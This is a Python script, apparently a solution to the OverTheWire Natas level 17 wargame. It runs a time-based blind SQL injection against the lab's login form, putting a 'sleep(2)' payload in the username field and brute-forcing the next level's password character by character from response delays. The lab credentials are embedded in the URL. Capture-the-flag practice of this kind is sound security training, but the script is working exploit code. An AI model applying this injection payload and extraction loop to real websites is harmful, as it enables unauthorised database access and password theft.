import requests, pprint
from bs4 import BeautifulSoup
 
#Time-Based Blind SQLi 

url = f"http://natas17:8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw@natas17.natas.labs.overthewire.org/index.php?debug=true"
possibleCharacters = list(map(chr, range(97, 123))) + list(map(chr, range(65, 91))) + list(map(chr, range(48, 58)))
resultFlag = ""

characterCounter = 0
while(len(resultFlag) < 32):
    challenge = resultFlag + possibleCharacters[characterCounter]
    
    challenge_params = {"username" : f'natas18" and password like "{challenge}%" and sleep(2) and "1"="1' }
    print("Testing: " + challenge)
    resp = requests.post(url, data=challenge_params)
    
    #print(BeautifulSoup(resp.text, 'html.parser').prettify())
    if(resp.elapsed.total_seconds() >= 2):
        print("Match!")
        resultFlag += possibleCharacters[characterCounter]
        characterCounter = 0
        continue
    else:
        characterCounter += 1



#print(BeautifulSoup(resp.text, 'html.parser').prettify())
print("Flag: " + resultFlag)
